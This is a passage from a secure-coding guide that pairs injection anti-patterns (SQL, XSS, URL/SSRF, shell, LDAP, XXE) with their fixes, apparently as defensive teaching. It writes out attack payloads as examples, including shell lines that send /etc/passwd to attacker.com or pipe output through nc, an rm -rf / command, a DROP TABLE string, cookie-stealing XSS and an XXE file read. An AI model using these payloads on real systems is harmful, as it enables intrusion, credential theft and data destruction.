# SECURITY-OUTPUT-ENCODING — Anti-Patterns and Canonical Patterns

Ten anti-pattern + canonical-pattern pairs covering the most common output-encoding failures. Each pair documents the broken approach, the failure mode, the authoritative source, the canonical fix, and the reason the fix holds.

Per `DEC-2026-05-17-003` Clause 1: every anti-pattern is paired with a canonical pattern. Per Phase 6 Checkpoint 1 Decision B: hard-refusal patterns are referenced from SECURITY-CORE's canonical APs by ID, not restated.

---

## AP-1: SQL via String Concatenation, f-string, or Template Literal

### Anti-Pattern

```typescript
// TypeScript / Node — template literal injection
async function findUser(name: string) {
  // Attacker name = "' OR '1'='1" → matches all users
  const result = await db.query(`SELECT * FROM users WHERE name = '${name}'`);
  return result.rows;
}
```

```python
# Python — f-string injection
def find_user(name: str):
    # Attacker name = "'; DROP TABLE users; --" → destroys table
    cursor.execute(f"SELECT * FROM users WHERE name = '{name}'")
    return cursor.fetchall()
```

```python
# Python — .format() injection (same class)
def find_user(name: str):
    cursor.execute("SELECT * FROM users WHERE name = '{}'".format(name))
    return cursor.fetchall()
```

```java
// Java — string concatenation
public List<User> findUser(String name) {
  String sql = "SELECT * FROM users WHERE name = '" + name + "'";
  return jdbcTemplate.query(sql, new UserRowMapper());
}
```

### Why It Fails

The query string and the user input flow through the same channel into the database. The database parses the resulting string as SQL syntax — quotes, statement terminators, comments, UNION, subqueries — and has no way to know which parts originated as data. Whatever the attacker injects becomes SQL syntax. The classic payloads (`' OR '1'='1`, `'; DROP TABLE...`, `' UNION SELECT password FROM admins--`) exploit this directly; modern injections use blind / time-based / out-of-band techniques to extract data without visible output.

**Source for failure mode:** `OWASP-TOP10 A05:2025` (Injection); `OWASP-ASVS V1.2.4`; `CWE-89` (SQL Injection).

### Canonical Pattern

```typescript
// TypeScript / Node — parameterized via pg driver
async function findUser(name: string) {
  // $1 is a parameter placeholder; pg sends query + values as separate channels
  const result = await db.query(
    'SELECT * FROM users WHERE name = $1',
    [name],
  );
  return result.rows;
}
```

```python
# Python — parameterized via DB-API
def find_user(name: str):
    # ? placeholder; the driver binds the value safely
    cursor.execute("SELECT * FROM users WHERE name = ?", (name,))
    return cursor.fetchall()
```

```python
# Python — named parameters via SQLAlchemy ORM
def find_user(name: str):
    return session.query(User).filter(User.name == name).all()
```

```java
// Java — PreparedStatement with parameter binding
public List<User> findUser(String name) {
  String sql = "SELECT * FROM users WHERE name = ?";
  return jdbcTemplate.query(sql, new Object[] { name }, new UserRowMapper());
}
```

### Why It Works

Parameterized queries send the query template and the parameter values to the database through separate channels. The database parses the template once with placeholders, plans the execution, then binds parameter values as data — values are never interpreted as SQL syntax regardless of their content. The `name` field can contain `'; DROP TABLE users; --` and the database will dutifully search for a user named exactly that string.

**Additional considerations:** The same discipline applies to NoSQL (MongoDB `$where` and `$regex` with untrusted input are injectable; use the query builder), GraphQL (variable binding, not query string construction), Cypher (parameterized `$param` syntax), HQL, and Elasticsearch DSL queries. The rule is universal across query languages: data and syntax flow through separate channels.

---

## AP-2: ORM "Always Safe" Assumption with Raw-Query Escape Hatch

### Anti-Pattern

```typescript
// TypeScript — Sequelize raw query with interpolation
async function searchUsers(searchTerm: string) {
  // sequelize.query DOES parameterize when used correctly — but interpolation bypasses it
  const [results] = await sequelize.query(
    `SELECT * FROM users WHERE bio LIKE '%${searchTerm}%'`,
  );
  return results;
}
```

```python
# Python — SQLAlchemy text() with interpolation
def search_users(search_term: str):
    # text() supports binding via :param — but f-string bypasses it
    stmt = text(f"SELECT * FROM users WHERE bio LIKE '%{search_term}%'")
    return session.execute(stmt).fetchall()
```

```typescript
// TypeScript — Knex.raw with interpolation
async function searchUsers(searchTerm: string) {
  // knex.raw supports ? bindings — but template literal bypasses
  return knex.raw(`SELECT * FROM users WHERE bio LIKE '%${searchTerm}%'`);
}
```

```ruby
# Ruby — ActiveRecord find_by_sql with interpolation
def search_users(search_term)
  # find_by_sql accepts parameterized arrays — but string interpolation bypasses
  User.find_by_sql("SELECT * FROM users WHERE bio LIKE '%#{search_term}%'")
end
```

### Why It Fails

The ORM provides parameterization in its native query builder (Sequelize `findAll({ where })`, SQLAlchemy `query.filter()`, Knex `.where()`, ActiveRecord `where`). Raw-query escape hatches exist for legitimate cases the builder can't express (complex CTEs, window functions, database-specific syntax) and *also* support parameter binding — but the interpolation form bypasses the binding entirely. The ORM didn't "fail to parameterize"; the developer asked it not to.

The trap is the assumption that "we use an ORM, we're safe" — true only for the native query-builder calls. Audit reveals concat-style raw queries scattered through the codebase for "performance," "complex query," or "quick fix" reasons. Each one is a SQL injection vector.

**Source for failure mode:** `OWASP-TOP10 A05:2025`; `OWASP-ASVS V1.2.4`; `CWE-89`.

### Canonical Pattern

```typescript
// TypeScript — Sequelize raw with replacements (parameterized)
async function searchUsers(searchTerm: string) {
  const [results] = await sequelize.query(
    'SELECT * FROM users WHERE bio LIKE :search',
    {
      replacements: { search: `%${searchTerm}%` },  // wildcard wraps the bound value, not concatenated into SQL
    },
  );
  return results;
}
```

```python
# Python — SQLAlchemy text() with bindparams
def search_users(search_term: str):
    stmt = text("SELECT * FROM users WHERE bio LIKE :search")
    return session.execute(stmt, {"search": f"%{search_term}%"}).fetchall()
```

```typescript
// TypeScript — Knex.raw with bindings
async function searchUsers(searchTerm: string) {
  return knex.raw(
    'SELECT * FROM users WHERE bio LIKE ?',
    [`%${searchTerm}%`],
  );
}
```

```ruby
# Ruby — ActiveRecord with array form
def search_users(search_term)
  User.find_by_sql(["SELECT * FROM users WHERE bio LIKE ?", "%#{search_term}%"])
end
```

### Why It Works

The raw-query APIs accept a query template + a separate bindings collection. The LIKE wildcards (`%`) are inside the *bound value*, not interpolated into the SQL string — the database sees the SQL template with a single placeholder and binds the literal value `%search_term%` to it. The parameterization channel still applies.

**Additional considerations:** Discovery tip — `grep -rnE "(sequelize\.query|\.raw\(|text\(['\"]|find_by_sql\(['\"])"` finds raw-query call sites; manually verify each for interpolation. Audit periodically; raw-query escape hatches drift back in when developers forget the parameterized form. For multi-clause LIKE patterns or dynamic identifier construction (table names, column names — which can't be parameterized), use allow-list validation (Cheat Sheet Defense Option 3) against a fixed set of permitted identifiers, then concatenate the validated identifier — never the unfiltered user input.

---

## AP-3: `dangerouslySetInnerHTML` / `v-html` / Unsafe Sinks with Untrusted Data

### Anti-Pattern

```tsx
// React — dangerouslySetInnerHTML with raw user input
function UserBio({ bio }: { bio: string }) {
  // Attacker bio = "<img src=x onerror=alert(document.cookie)>" → XSS
  return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}
```

```vue
<!-- Vue — v-html with raw user input -->
<template>
  <div v-html="user.bio"></div>
</template>
```

```typescript
// Angular — bypassSecurityTrustHtml with raw user input
@Component({ template: '<div [innerHTML]="trustedBio"></div>' })
export class UserProfileComponent {
  constructor(private sanitizer: DomSanitizer) {}
  // bypassSecurityTrustHtml explicitly disables Angular's sanitization
  trustedBio = this.sanitizer.bypassSecurityTrustHtml(this.user.bio);
}
```

```javascript
// Browser — innerHTML with raw user input (vanilla)
function renderBio(bio) {
  document.getElementById('bio').innerHTML = bio;
}
```

### Why It Fails

These APIs exist specifically to opt out of the framework's auto-escape. They take raw HTML and insert it into the DOM as-is. When the input is user-controlled, an attacker injects `<img src=x onerror=...>`, `<svg onload=...>`, `<iframe srcdoc=...>`, or any number of XSS vectors. Modern browsers block inline `<script>` insertion via `innerHTML` (the script doesn't execute) but accept event handlers on injected elements — the bypass is well-documented and the attack surface is large.

The XSS Cheat Sheet's §Framework Security explicitly enumerates these as bypass APIs: React `dangerouslySetInnerHTML`, Angular `bypassSecurityTrust*`, Lit `unsafeHTML`, Polymer `htmlLiteral`. The naming (`dangerously`, `bypass`, `unsafe`) is intentional — the framework is signaling that you've left the safe path.

**Source for failure mode:** `OWASP-TOP10 A03:2021 / A05:2025` (Injection — XSS); `OWASP-ASVS V1.2.1, V1.3.1`; `OWASP-CHEAT-XSS §Framework Security`; `CWE-79`.

### Canonical Pattern

```tsx
// React — JSX text content (auto-escaped)
function UserBio({ bio }: { bio: string }) {
  return <div>{bio}</div>;  // React entity-encodes < > & " ' automatically
}
```

```tsx
// React — with sanitized rich HTML (when rich content is genuinely needed)
import DOMPurify from 'isomorphic-dompurify';

function UserBio({ bio }: { bio: string }) {
  const clean = DOMPurify.sanitize(bio, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'br', 'p'],
    ALLOWED_ATTR: ['href'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

```vue
<!-- Vue — mustache interpolation (auto-escaped) -->
<template>
  <div>{{ user.bio }}</div>
</template>
```

```python
# Python (Flask) — Jinja2 autoescape (default-on for HTML responses)
@app.route('/profile/<user_id>')
def profile(user_id):
    user = get_user(user_id)
    return render_template('profile.html', user=user)
# In profile.html:
#   <div>{{ user.bio }}</div>  ← Jinja2 entity-encodes by default
```

```python
# Python — with sanitized rich HTML via bleach
import bleach

ALLOWED_TAGS = ['b', 'i', 'em', 'strong', 'a', 'br', 'p']
ALLOWED_ATTRS = {'a': ['href']}

def sanitize_bio(bio: str) -> str:
    return bleach.clean(bio, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)
```

### Why It Works

The framework's auto-escape walks the rendered tree and entity-encodes every text node. User input flows into the DOM as text, not as HTML — `<script>` becomes `&lt;script&gt;` and renders as visible text rather than executing. For genuinely rich content (Markdown-rendered articles, WYSIWYG output), DOMPurify (client) or Bleach (Python) parse the HTML, walk the tree, and remove any tag or attribute not in an explicit allow-list. The result is HTML that's structurally rich but stripped of executable surface.

**Additional considerations:** *Trusted Types.* On modern browsers, the `Trusted Types` API (specified in W3C, supported in Chromium-based browsers) lets you enforce that only "trusted" string types flow into DOM sinks — `innerHTML = "..."` becomes a TypeError unless the value is a `TrustedHTML` instance produced by a policy. This is defense-in-depth against the bypass APIs being accidentally re-introduced. *Configure DOMPurify carefully.* The default `DOMPurify.sanitize(input)` is permissive (allows many HTML5 tags); for user bio fields, explicitly constrain to a small allow-list. *Resist the temptation to allow inline styles.* CSS contexts have their own injection surface (CSS expression, `behavior:` IE legacy, `@import url(...)`); user-controlled style attributes deserve their own scrutiny.

---

## AP-4: Manual HTML Escape via `str.replace` (Misses Four of Five Contexts)

### Anti-Pattern

```typescript
// Hand-rolled "HTML escape" — works for element body, fails elsewhere
function escapeHtml(s: string): string {
  return s.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

// Used inside an attribute — quote injection works
const html = `<input value=${escapeHtml(user.input)}>`;
// Attacker user.input = `" autofocus onfocus="alert(1)`
// Result: <input value="" autofocus onfocus="alert(1)>
// The attribute parser sees a complete value="" then a new attribute autofocus then onfocus
```

```python
# Python — manual escape, same class
def escape_html(s: str) -> str:
    return s.replace('<', '&lt;').replace('>', '&gt;')

# Used in JavaScript context — backslash escape needed, not entity encode
template = f"""
<script>
  const username = '{escape_html(user.username)}';
</script>
"""
# Attacker username = "'; alert(1); //"
# Result: const username = ''; alert(1); //';  ← entity encoding doesn't help here
```

```javascript
// Even with " and ' escaping, URL context needs encodeURIComponent
function escapeAll(s) {
  return s.replace(/[<>&"']/g, c => ({
    '<': '&lt;', '>': '&gt;', '&': '&amp;',
    '"': '&quot;', "'": '&#39;',
  })[c]);
}
const html = `<a href="/search?q=${escapeAll(query)}">`;
// Attacker query = "x&utm=javascript:alert(1)"
// Result: /search?q=x&amp;utm=javascript:alert(1) — but the &amp; gets URL-decoded
// to & by the browser, and the URL parser then sees the utm parameter
// Real fix: encodeURIComponent for URL components
```

### Why It Fails

HTML has five distinct contexts: element body, attribute (quoted or unquoted), JavaScript inside `<script>`, CSS inside `<style>`, and URL inside `href`/`src`. Each has different escape rules. Entity encoding (`&lt;` `&gt;` `&amp;` `&quot;` `&#39;`) is correct for element body and quoted attributes but wrong for JavaScript context (needs `\xNN` or `\uNNNN`), CSS context (needs `\HH` hex escape), and URL context (needs percent-encoding). A `str.replace` helper that "escapes HTML" handles one of five and silently fails the other four.

The pattern also misses unquoted attributes (which can be broken by whitespace alone — `value=x` becomes `value=x onmouseover=alert(1)` without needing any escaped character), JavaScript pseudo-protocols in URLs (no characters need escaping; the *protocol* itself is the attack), and Unicode-based bypasses.

**Source for failure mode:** `OWASP-ASVS V1.2.1, V1.2.3`; `OWASP-CHEAT-XSS §Output Encoding` (lists all five contexts explicitly); `CWE-79`.

### Canonical Pattern

```tsx
// React JSX — context-aware auto-escape handles all five contexts
function Profile({ user }: { user: User }) {
  return (
    <div>
      {/* Element body — entity encoded */}
      <p>{user.bio}</p>

      {/* Attribute — quote-encoded properly */}
      <input value={user.username} />

      {/* URL — React's JSX URL handling + manual protocol check */}
      <a href={isSafeUrl(user.website) ? user.website : '#'}>website</a>

      {/* JavaScript context — never inline scripts with dynamic data; use data attributes */}
      <div data-username={user.username}>...</div>
    </div>
  );
}

function isSafeUrl(url: string): boolean {
  try {
    const u = new URL(url);
    return u.protocol === 'https:' || u.protocol === 'http:';
  } catch {
    return false;
  }
}
```

```python
# Python — Jinja2 with explicit context filters
# In template:
#   <p>{{ user.bio }}</p>                            ← autoescape (HTML)
#   <input value="{{ user.username | e(quote=True) }}"> ← attribute
#   <a href="{{ user.website | urlencode }}">...</a> ← URL component
#   <script>const u = {{ user.username | tojson }};</script> ← JS via tojson
```

### Why It Works

The framework's auto-escape is context-aware. React, Vue, Angular, and Svelte track which context they're rendering into (element, attribute, URL, JavaScript) and apply the encoding appropriate to each. Jinja2's `tojson` filter is the JS-context counterpart; `urlencode` is the URL counterpart; default `|e` is HTML. Manual hand-rolled escape can never match this because the developer doesn't know at the escape site which of five contexts will consume the value.

**Additional considerations:** When framework templating is genuinely not available (raw HTML construction in plain Node, dynamic email body templates), use a vetted library — `lodash.escape` and Python's `html.escape(s, quote=True)` cover the HTML and attribute contexts; for JS context use `JSON.stringify` (and ensure the resulting string is wrapped properly in the script); for CSS use a CSS-specific escape (rare; usually the right answer is "don't put user input in `<style>`"); for URL use `encodeURIComponent` per component plus the protocol allow-list from Rule 5.4.

---

## AP-5: URL via Concat; No Safe-Protocol Allow-List

### Anti-Pattern

```typescript
// React — user-controlled href without protocol validation
function UserLink({ user }: { user: User }) {
  // Attacker user.website = "javascript:alert(document.cookie)"
  return <a href={user.website}>{user.name}</a>;
}
```

```typescript
// Open-redirect via query parameter
app.get('/login', (req, res) => {
  // Attacker visits /login?next=https://evil.com
  // After login, redirect goes to evil.com → phishing primitive
  if (req.user) {
    res.redirect(req.query.next as string);
  } else {
    res.render('login', { next: req.query.next });
  }
});
```

```python
# Server-side fetch with user-controlled URL → SSRF
@app.route('/preview')
def preview():
    url = request.args.get('url')
    # Attacker url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    # Server fetches AWS metadata service → credential theft
    response = requests.get(url)
    return response.text
```

### Why It Fails

URLs accept the `javascript:` pseudo-protocol, which executes JavaScript when followed (clicked link, image-loaded `src`, iframe `src`). They also accept `data:` URIs that can encode entire HTML documents with embedded scripts. Absolute redirects to attacker-controlled domains turn legitimate login flows into phishing primitives — `?next=https://evil.com/login` after the user authenticates redirects them to the attacker's lookalike page where they re-enter credentials.

Server-side, user-supplied URLs reach internal services that aren't exposed publicly: cloud metadata services (AWS `169.254.169.254`, GCP, Azure equivalents), internal admin panels, localhost services, container-orchestrator APIs. SSRF via user-controlled fetch URL is the entry point for many cloud-credential thefts.

**Source for failure mode:** `OWASP-TOP10 A10:2021 / A05:2025` (the SSRF category was prominent in 2021 and was folded into Injection or Misconfiguration in 2025 — the underlying class persists); `OWASP-ASVS V1.2.2, V1.3.6`; `OWASP-CHEAT-XSS §Output Encoding for URL Contexts`.

### Canonical Pattern

```typescript
// React — protocol allow-list for outbound links
const SAFE_PROTOCOLS = new Set(['https:', 'http:']);

function isSafeUrl(url: string): boolean {
  try {
    return SAFE_PROTOCOLS.has(new URL(url).protocol);
  } catch {
    return false;
  }
}

function UserLink({ user }: { user: User }) {
  const href = isSafeUrl(user.website) ? user.website : '#';
  return <a href={href} rel="noopener noreferrer" target="_blank">{user.name}</a>;
}
```

```typescript
// Open-redirect defense — allow-list of permitted redirect destinations
const ALLOWED_REDIRECT_PATHS = new Set(['/dashboard', '/settings', '/onboarding']);

app.get('/login', (req, res) => {
  const next = typeof req.query.next === 'string' ? req.query.next : '/dashboard';
  // Only allow relative paths from the allow-list
  const safeNext = ALLOWED_REDIRECT_PATHS.has(next) ? next : '/dashboard';
  if (req.user) {
    res.redirect(safeNext);
  } else {
    res.render('login', { next: safeNext });
  }
});
```

```python
# Server-side URL fetch — host + protocol allow-list for SSRF defense
from urllib.parse import urlparse
import ipaddress
import socket

ALLOWED_HOSTS = {'api.partner.com', 'images.cdn.com'}

def is_safe_outbound(url: str) -> bool:
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        return False
    if parsed.hostname not in ALLOWED_HOSTS:
        return False
    # Resolve to verify the hostname doesn't point at a private IP (DNS-rebinding defense)
    try:
        addr = socket.gethostbyname(parsed.hostname)
        if ipaddress.ip_address(addr).is_private or ipaddress.ip_address(addr).is_loopback:
            return False
    except (socket.gaierror, ValueError):
        return False
    return True

@app.route('/preview')
def preview():
    url = request.args.get('url', '')
    if not is_safe_outbound(url):
        abort(400)
    response = requests.get(url, timeout=5)
    return response.text
```

### Why It Works

The protocol allow-list refuses the dangerous protocols (`javascript:`, `data:`, `file:`, `vbscript:`) at the boundary. The open-redirect defense narrows redirect destinations to a known-safe set rather than accepting arbitrary URLs. The SSRF defense layers protocol + hostname + post-DNS-resolution IP check — even if the attacker controls a DNS record that resolves to a private IP, the check catches it. The `rel="noopener noreferrer"` on outbound links prevents the new window from gaining access to the opener's window object (a separate but related defense for `target="_blank"` links).

**Additional considerations:** *DNS rebinding.* Sophisticated SSRF attacks use DNS records that return public IP first, then private IP on the second resolution — the check passes, the fetch hits the internal service. The defense is to resolve once, validate, and pass the resolved IP (not the hostname) to the fetch — or use a host-bypassing fetch library that pins the resolution. *Same-origin redirects.* If your application uses session cookies on `app.example.com`, a redirect to `app.example.com.evil.com` looks similar enough to phish on; lookalike-domain checks add depth. *Cloud metadata specifically.* Cloud providers have made progress on metadata-service protection (AWS IMDSv2 requires a session token; GCP and Azure have similar improvements); but legacy code on legacy infrastructure remains vulnerable.

---

## AP-6: Shell-String Spawn (`exec`, `shell=True`, `bash -c`)

### Anti-Pattern

```typescript
// Node — child_process.exec with template literal
import { exec } from 'child_process';

function backupUserFiles(userId: string, dest: string) {
  // Attacker userId = "1; rm -rf / #" — destroys the host
  exec(`tar -czf ${dest} /var/users/${userId}/`, (err) => {
    if (err) console.error(err);
  });
}
```

```python
# Python — subprocess.run with shell=True
import subprocess

def convert_image(source: str, target: str):
    # Attacker source = "in.jpg; curl attacker.com/exfil?$(cat /etc/passwd)"
    subprocess.run(f"convert {source} -resize 800x {target}", shell=True)
```

```python
# Python — os.system (always shell)
import os

def play_audio(filename: str):
    # Same class — os.system always invokes the shell
    os.system(f"mpv {filename}")
```

```java
// Java — Runtime.exec with single string (shell interpretation on some platforms)
public void runReport(String reportName) {
  // Runtime.exec(String) tokenizes on whitespace; injection via metacharacters
  Runtime.getRuntime().exec("python3 generate_report.py " + reportName);
}
```

```go
// Go — exec.Command with bash -c
func compressLog(path string) {
  // bash -c invocation re-introduces shell interpretation
  cmd := exec.Command("bash", "-c", fmt.Sprintf("gzip %s", path))
  cmd.Run()
}
```

### Why It Fails

Shell-string spawn passes the entire command — including user-supplied arguments concatenated in — to a shell (`/bin/sh`, `bash`, `cmd.exe`). The shell then *re-tokenizes* the string, interpreting `;`, `&`, `|`, `$()`, `` ` ` ``, redirections (`>`, `<`), globs (`*`, `?`), and variable expansion (`$VAR`). An attacker who controls any portion of the user input controls all of those metacharacters.

The standard payloads — `; rm -rf /`, `; curl attacker.com/$(cat /etc/passwd)`, `&& whoami | nc attacker.com 1234`, `$(reboot)` — all exploit this. The application code looks innocent (it just wanted to run a command); the shell turns the innocent-looking string into multiple commands.

Per the OS Command Injection Cheat Sheet's Defense Option 1: "the primary defense is to avoid calling OS commands directly." When the operation can be done via a language library (file copy, archive creation, image conversion via PIL/ImageMagick library bindings, audio playback via library API), the library is the answer. When a process spawn is genuinely required, the argument-array form (Defense Option 3 — parameterization) is the universal answer.

**Source for failure mode:** `OWASP-TOP10 A05:2025` (Injection — OS command injection); `OWASP-ASVS V1.2.5`; `OWASP-CHEAT-OSI Defense Options 1, 3`; `CWE-78`.

### Canonical Pattern

```typescript
// Node — execFile with argument array (no shell)
import { execFile } from 'child_process';

function backupUserFiles(userId: string, dest: string) {
  // Validate userId is a known shape first (e.g., UUID or digits-only)
  if (!/^[0-9a-f-]{36}$/i.test(userId)) {
    throw new Error('Invalid userId');
  }
  // execFile passes args as a list — no shell, no re-tokenization
  execFile('tar', ['-czf', dest, `/var/users/${userId}/`], (err) => {
    if (err) console.error(err);
  });
}
```

```python
# Python — subprocess.run with argument list (no shell)
import subprocess
from pathlib import Path

def convert_image(source: str, target: str):
    src = Path(source).resolve()
    tgt = Path(target).resolve()
    # Validate the resolved paths are inside an expected directory
    if not str(src).startswith('/uploads/') or not str(tgt).startswith('/converted/'):
        raise ValueError('Path outside allowed directories')
    # shell=False (default); args is a list passed directly to execve
    subprocess.run(['convert', str(src), '-resize', '800x', str(tgt)], check=True)
```

```java
// Java — ProcessBuilder with separated arguments
public void runReport(String reportName) {
  if (!reportName.matches("^[a-z_]+$")) {
    throw new IllegalArgumentException("Invalid report name");
  }
  ProcessBuilder pb = new ProcessBuilder("python3", "generate_report.py", reportName);
  pb.inheritIO();
  try {
    pb.start().waitFor();
  } catch (IOException | InterruptedException e) {
    Thread.currentThread().interrupt();
  }
}
```

```go
// Go — exec.Command with separate arguments (no shell)
func compressLog(path string) error {
  if !strings.HasPrefix(path, "/var/log/") {
    return fmt.Errorf("path outside log directory")
  }
  cmd := exec.Command("gzip", path)
  return cmd.Run()
}
```

### Why It Works

The argument-array form passes the command and arguments directly to `execve` (or the OS equivalent) as discrete parameters. The shell is never invoked. The OS sees `argv[0] = "tar"`, `argv[1] = "-czf"`, `argv[2] = "/backups/user.tar.gz"`, `argv[3] = "/var/users/abc123/"` — even if `argv[3]` contains `; rm -rf /`, it's treated as the literal filename `; rm -rf /` (which `tar` won't find and will error on), not as a shell command separator.

**Additional considerations:** *When the shell is genuinely needed* (pipes, globs, redirections), either implement the equivalent in code (Python file iteration replaces `ls | grep`; in-process compression replaces `tar | gzip`) or pass user-controlled data via stdin / environment variable / temp file rather than as a command argument. *Path traversal as a separate concern.* Argument-array form doesn't defend against `../../etc/passwd` as the filename — that's path-traversal validation, which belongs to `security-input-validation` (Rule 5.3 positive validation) and `security-file-uploads` (Phase 7). *Windows specifics.* On Windows, `CreateProcess` joins the argument array back into a single command-line string per Microsoft's quoting rules; .NET 6+ `ArgumentList` (rather than `Arguments`) handles this correctly. Avoid `cmd.exe /c` invocations for the same reason `bash -c` is dangerous.

---

## AP-7: LDAP Filter Built via String Concatenation

### Anti-Pattern

```python
# Python — LDAP filter via f-string
import ldap

def find_user_dn(connection, username: str) -> str:
    # Attacker username = "*)(uid=*"
    # Filter becomes: (&(uid=*)(uid=*)(objectClass=person))
    # Matches every user — authentication bypass
    filter_str = f"(&(uid={username})(objectClass=person))"
    result = connection.search_s('ou=users,dc=example,dc=com', ldap.SCOPE_SUBTREE, filter_str)
    return result[0][0]
```

```java
// Java — LDAP filter via string concat
public String findUserDN(DirContext ctx, String username) throws NamingException {
  String filter = "(&(uid=" + username + ")(objectClass=person))";
  NamingEnumeration<SearchResult> results = ctx.search(
    "ou=users,dc=example,dc=com",
    filter,
    new SearchControls()
  );
  return results.next().getNameInNamespace();
}
```

```csharp
// .NET — LDAP filter via string concat
public string FindUserDN(DirectoryEntry root, string username) {
  using var searcher = new DirectorySearcher(root) {
    Filter = $"(&(uid={username})(objectClass=person))"
  };
  return searcher.FindOne().Path;
}
```

### Why It Fails

The LDAP filter syntax uses parentheses to group conditions and asterisks as wildcards. User input concatenated into a filter can inject new conditions or change wildcard behavior. The classic payload `*)(uid=*` for `username` turns the filter into `(&(uid=*)(uid=*)(objectClass=person))` — the first `uid=*` matches every user, the second `(uid=*)` is appended as a separate condition (also matching all), and the rest of the original filter remains.

When LDAP is the authentication backend, this is authentication bypass. The application asks LDAP "find a user with username X and password Y"; the injection makes LDAP say "yes, here's a user" regardless of credentials. When LDAP is an authorization or directory lookup, the injection exposes data — find every entry matching the modified filter.

**Source for failure mode:** `OWASP-ASVS V1.2.6`; `OWASP-CHEAT-LDAP`; `CWE-90` (LDAP Injection).

### Canonical Pattern

```python
# Python — ldap3 library with escape_filter_chars
from ldap3.utils.conv import escape_filter_chars
import ldap3

def find_user_dn(connection: ldap3.Connection, username: str):
    safe_username = escape_filter_chars(username)
    filter_str = f"(&(uid={safe_username})(objectClass=person))"
    connection.search('ou=users,dc=example,dc=com', filter_str, search_scope=ldap3.SUBTREE)
    if connection.entries:
        return connection.entries[0].entry_dn
    return None
```

```java
// Java — ESAPI Encoder.encodeForLDAP
import org.owasp.esapi.ESAPI;
import org.owasp.esapi.Encoder;

public String findUserDN(DirContext ctx, String username) throws NamingException {
  Encoder encoder = ESAPI.encoder();
  String safeUsername = encoder.encodeForLDAP(username);
  String filter = "(&(uid=" + safeUsername + ")(objectClass=person))";
  NamingEnumeration<SearchResult> results = ctx.search(
    "ou=users,dc=example,dc=com",
    filter,
    new SearchControls()
  );
  return results.hasMore() ? results.next().getNameInNamespace() : null;
}
```

```csharp
// .NET — AntiXSS Encoder.LdapFilterEncode
using System.Web.Security.AntiXss;

public string FindUserDN(DirectoryEntry root, string username) {
  var safeUsername = AntiXssEncoder.LdapFilterEncode(username);
  using var searcher = new DirectorySearcher(root) {
    Filter = $"(&(uid={safeUsername})(objectClass=person))"
  };
  var result = searcher.FindOne();
  return result?.Path;
}
```

### Why It Works

The escape functions apply RFC 4515 §3 character escaping — `*` becomes `\2A`, `(` becomes `\28`, `)` becomes `\29`, `\` becomes `\5C`, `NUL` becomes `\00`. The escaped values cannot be interpreted as filter syntax; they're literal data in the filter. The attacker's `*)(uid=*` becomes `\2A\29\28uid=\2A` in the filter string, which LDAP searches for as a literal string and finds zero matches.

For Distinguished Names (when constructing a DN from user-supplied components, e.g., for binding), use the corresponding DN escape function (`encodeForDN` in ESAPI, `LdapDistinguishedNameEncode` in .NET, `escape_rdn` in Python ldap3) — RFC 4514 §2.4 specifies a different character set for DN context.

**Additional considerations:** *Bind authentication specifically.* Many LDAP-authentication flows use the `bind` operation rather than `search` + password compare — bind takes a DN + password directly and authenticates them. For bind, the DN construction is the injection surface (use `encodeForDN` / RFC 4514 escaping). *Library-native parameterization.* "LINQ to LDAP" and similar frameworks use `{0}` placeholder syntax that handles escaping automatically — prefer these where available. *Anonymous bind.* Disable anonymous LDAP bind in production; an attacker who can search without credentials gets to enumerate users for further attack.

---

## AP-8: XML Parser with External-Entity Resolution Enabled (XXE)

### Anti-Pattern

```python
# Python — xml.etree.ElementTree with default config
import xml.etree.ElementTree as ET

def parse_user_xml(xml_text: str):
    # Default ElementTree resolves external entities on some versions
    # Attacker XML:
    # <?xml version="1.0"?>
    # <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    # <root>&xxe;</root>
    return ET.fromstring(xml_text)
```

```python
# Python — lxml with default config (resolves entities)
from lxml import etree

def parse_config_xml(xml_text: str):
    # lxml default: resolve_entities=True, no_network=False
    return etree.fromstring(xml_text)
```

```java
// Java — DocumentBuilder with default config
public Document parseXml(String xml) throws Exception {
  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
  DocumentBuilder builder = factory.newDocumentBuilder();
  return builder.parse(new InputSource(new StringReader(xml)));
  // Default config: external entities resolved → XXE
}
```

```java
// Java — SAXParser with default config
public void processSaxXml(String xml) throws Exception {
  SAXParserFactory factory = SAXParserFactory.newInstance();
  SAXParser parser = factory.newSAXParser();
  parser.parse(new InputSource(new StringReader(xml)), new MyHandler());
  // Default config also vulnerable
}
```

### Why It Fails

XML's DOCTYPE declaration supports external entity definitions that reference URIs. A parser that resolves these entities fetches the referenced URI and substitutes the content into the parsed document. The attacker uses this to:

- Read local files (`SYSTEM "file:///etc/passwd"`)
- Perform SSRF (`SYSTEM "http://169.254.169.254/latest/meta-data/"`)
- Cause DoS via billion-laughs / quadratic-blowup attacks (recursive entity expansion)
- Exfiltrate data via out-of-band channels (parameter entities + external DTDs)

Many XML parser defaults historically allowed external entity resolution because that's part of the XML 1.0 specification. The defense is parser configuration: explicitly disable DTD loading, external entity resolution, and network access during parsing.

**Source for failure mode:** `OWASP-TOP10 A05:2017` (XXE was a Top 10 category; folded into A05:2025 Injection in current Top 10); `OWASP-ASVS V1.5.1`; `CWE-611` (Improper Restriction of XML External Entity).

### Canonical Pattern

```python
# Python — defusedxml library (drop-in safe replacement)
import defusedxml.ElementTree as ET

def parse_user_xml(xml_text: str):
    # defusedxml refuses external entities, DTDs, and network access
    return ET.fromstring(xml_text)
```

```python
# Python — lxml with explicit hardening
from lxml import etree

def parse_config_xml(xml_text: str):
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        load_dtd=False,
        dtd_validation=False,
    )
    return etree.fromstring(xml_text, parser=parser)
```

```java
// Java — DocumentBuilder hardened per OWASP guidance
public Document parseXml(String xml) throws Exception {
  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
  // Disable DTDs entirely
  factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
  // Disable external entity resolution
  factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
  factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
  factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
